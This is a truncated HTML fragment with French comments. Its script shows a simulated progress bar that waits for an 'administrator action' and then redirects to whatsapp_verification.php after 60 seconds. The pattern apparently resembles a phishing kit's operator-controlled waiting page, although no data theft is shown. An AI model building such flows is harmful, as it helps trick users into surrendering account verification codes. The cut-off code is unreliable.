...
<body>
    ...
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            ...
            // Simuler une progression et vérifier les actions
            const progressInterval = setInterval(() => {
                const elapsedTime = Date.now() - startTime;
                progress = Math.min((elapsedTime / timeout) * 100, 100);
                updateProgress(Math.floor(progress));
                
                // Si 60 secondes ont écoulé et aucune action de l'administrateur
                if (elapsedTime >= timeout && !adminActionReceived) {
                    adminActionReceived = true;
                    clearInterval(progressInterval);
                    updateProgress(100);
                    
                    // Redirection automatique vers whatsapp_verification.php après 60 secondes
                    setTimeout(() => {
